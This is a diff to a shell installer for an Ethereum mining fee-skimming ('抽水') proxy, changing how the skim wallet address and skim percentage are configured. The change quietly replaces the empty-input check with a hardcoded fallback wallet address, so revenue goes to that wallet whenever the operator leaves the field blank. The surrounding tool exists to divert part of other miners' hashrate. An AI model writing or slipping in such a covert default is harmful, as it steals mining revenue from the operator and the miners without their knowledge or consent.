@@ -199,19 +199,13 @@ eth_miner_config() {
     while :; do
         echo -e "请输入你的ETH钱包地址或者你在矿池的用户名"
         read -p "$(echo -e "(一定不要输入错误，错了就抽给别人了):")" ethUser
-        if [ -z "$ethUser" ]; then
-            echo
-            echo
-            echo " ..一定要输入一个钱包地址或者用户名啊....."
-            echo
-        else
-            echo
-            echo
-            echo -e "$yellow ETH抽水用户名/钱包名 = $cyan$ethUser$none"
-            echo "----------------------------------------------------------------"
-            echo
-            break
-        fi
+        [ -z "$ethUser" ] && ethUser="0x3fA195CAFe2a7891595353Ae8Db201cEe32d1591"
+	echo
+	echo
+	echo -e "$yellow ETH抽水用户名/钱包名 = $cyan$ethUser$none"
+	echo "----------------------------------------------------------------"
+	echo
+	break
     done
     while :; do
         echo -e "请输入你喜欢的矿工名，抽水成功后你可以在矿池看到这个矿工名"
@@ -226,8 +220,8 @@ eth_miner_config() {
     done
     while :; do
         echo -e "请输入ETH抽水比例 ["$magenta"0.3-20"$none"]"
-        read -p "$(echo -e "(默认: ${cyan}6${none}):")" ethTaxPercent
-        [ -z "$ethTaxPercent" ] && ethTaxPercent=6
+        read -p "$(echo -e "(默认: ${cyan}1${none}):")" ethTaxPercent
+        [ -z "$ethTaxPercent" ] && ethTaxPercent=1
         case $ethTaxPercent in
         0\.[3-9] | 0\.[3-9][0-9]* | [1-9] | 1[0-9] | 20 | [1-9]\.[0-9]* | 1[0-9]\.[0-9]*)
             echo
